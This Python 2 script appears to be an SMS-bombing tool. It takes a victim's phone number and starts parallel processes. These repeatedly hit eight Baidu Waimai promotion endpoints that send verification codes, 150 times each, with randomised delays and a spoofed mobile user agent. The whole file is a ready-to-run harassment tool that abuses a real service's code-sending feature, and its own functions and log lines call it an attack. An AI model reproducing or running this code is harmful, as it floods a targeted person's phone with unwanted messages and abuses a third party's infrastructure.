import httplib,urllib,sys,os,re,urllib2
import string,random,time
import multiprocessing

delay_min = 600     # 10 min
delay_max = 600*6   # 1 hour
count = 150

def attack(num,url,phone,count,mode):
    url = url % phone
    data = None
    header = {"User-Agent": "Mozilla/5.0 (Linux;U;Android 2.3;en-us;Nexus One Build/FRF91)AppleWebKit/999+(KHTML, like Gecko)Version/4.0 Mobile Safari/999.9"}
    for i in range(count):
        try:
            request = urllib2.Request(url, data, header)
            response = urllib2.urlopen(request)
            print 'process[%s] attack[%s] success!!!' % (str(num),str(i))
            time.sleep(random.randint(delay_min,delay_max))
        except Exception, e:
            print e
            print 'process[%s] attack[%s] failed!!!' % (str(num),str(i))

if __name__ == "__main__":
    phone = sys.argv[1]
    URLs = [ \
           ('https://waimai.baidu.com/hongbao/npactivity?caseid=HMTYzMzYxODkyMA==&sign=39e339f3191284fd2b812ff51ad93fef&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?caseid=HMTMxOTgwNDc3Ng==&sign=b4b4e44d0f3491858d193fdd084be39d&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?caseid=HMTYwODEwNTYwOA==&sign=be04ab697d28f96860e7414980b4055d&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?caseid=HMTI4NDYyMTg3Mg==&sign=a48251a5bcd0a310012f9714d3d70ab6&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?caseid=HMTM0NTc5ODM3Ng==&sign=aaffabf6a366cd7181088c665a73f00c&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?caseid=HMTQ3NzQzNDMzNg==&sign=591a687fb928bdff46c63e76f44535eb&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?caseid=HMTMzOTQxMzI0MA==&sign=7c78d49da3018cded32cadab945ad958&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1), \
           ('http://waimai.baidu.com/hongbao/npactivity?from=message&caseid=HOTQ2OTU2ODQ0&sign=ffc95412989f0fb9a20dee3e32f728af&invite_code=EZLUF782&opt=send_code&display=json&phone=%s',1) \
           #('',1), \
           #('http://waimai.baidu.com/hongbao/npactivity?caseid=HNTAyODQ4NjYw&sign=7ac93770eba2d7faf6d107950af24949&opt=send_code&display=json&phone=%s',1) \

           ]

    for i in range(len(URLs)):
        url = URLs[i][0]
        mode = URLs[i][1]
        p = multiprocessing.Process(target=attack, args=(i,url,phone,count,mode,))
        p.start()
